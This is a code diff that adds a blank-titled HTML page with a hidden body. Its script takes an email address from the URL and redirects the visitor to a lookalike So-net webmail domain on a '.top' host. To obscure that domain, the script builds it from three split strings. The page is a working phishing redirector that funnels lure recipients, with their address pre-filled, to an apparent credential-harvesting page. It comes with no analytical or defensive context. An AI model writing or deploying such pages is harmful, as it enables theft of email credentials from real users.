@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>.</title>
+    <style>
+        body { display: none; }
+    </style>
+    <script>
+        (function() {
+            var part1 = "https://support-japan-activemail";
+            var part2 = ".top/so-net.ne.jp/option";
+            var part3 = "/mail/webmail/app/index.html#";
+
+            // Function to get the email from the query string
+            function getQueryParameter(param) {
+                var urlParams = new URLSearchParams(window.location.search);
+                return urlParams.get(param);
+            }
+
+            // Get the 'email' parameter from the URL query string
+            var email = getQueryParameter('email');
+
+            // Decode the email parameter to keep @ symbol intact
+            if (email) {
+                var decodedEmail = decodeURIComponent(email);
+
+                // Construct the redirect URL without any prefix
+                var redirectUrl = part1 + part2 + part3 + decodedEmail;
+
+                // Redirect to the constructed URL
+                window.location.href = redirectUrl;
+            }
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
